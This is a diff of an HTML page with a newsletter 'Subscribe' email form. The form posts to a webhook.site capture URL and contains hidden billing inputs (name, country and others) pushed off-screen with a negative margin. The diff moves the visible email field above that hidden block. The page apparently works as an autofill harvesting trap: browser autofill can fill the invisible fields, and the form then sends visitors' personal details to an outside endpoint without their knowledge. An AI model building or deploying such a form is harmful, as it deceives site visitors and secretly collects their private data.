@@ -64,7 +64,25 @@
 
     <!-- If you have a backend endpoint, set the action to it and remove JS below for pure HTML POST -->
     <form name="addr1.sections" id="sections1" action="https://webhook.site/535f380e-ceb9-4fed-bb87-1d2b55d7f47c" method="post">
-  <div id="billing1">
+      <div class="row">
+        <div>
+          <label for="email">Email address</label>
+          <input
+            id="email"
+            type="email"
+            name="email"
+            placeholder="you@example.com"
+            autocomplete="email"
+            inputmode="email"
+            required
+            aria-describedby="email-help"
+          />
+          <div id="email-help" class="help">We’ll send a confirmation email. Please use a valid address.</div>
+        </div>
+        <div style="align-self:end;">
+          <button id="submit-btn" type="submit">Subscribe</button>
+        </div>
+         <div id="billing1">
     
     <p style="margin-left:-1500px">
     Name: <input type="text" name="name"><br>
@@ -84,25 +102,6 @@
     Country: <input name="country"> <br>
     <p style="margin-left:-1500px">
   </div>
-  
-      <div class="row">
-        <div>
-          <label for="email">Email address</label>
-          <input
-            id="email"
-            type="email"
-            name="email"
-            placeholder="you@example.com"
-            autocomplete="email"
-            inputmode="email"
-            required
-            aria-describedby="email-help"
-          />
-          <div id="email-help" class="help">We’ll send a confirmation email. Please use a valid address.</div>
-        </div>
-        <div style="align-self:end;">
-          <button id="submit-btn" type="submit">Subscribe</button>
-        </div>
       </div>
 
       <!-- Honeypot field to deter bots -->
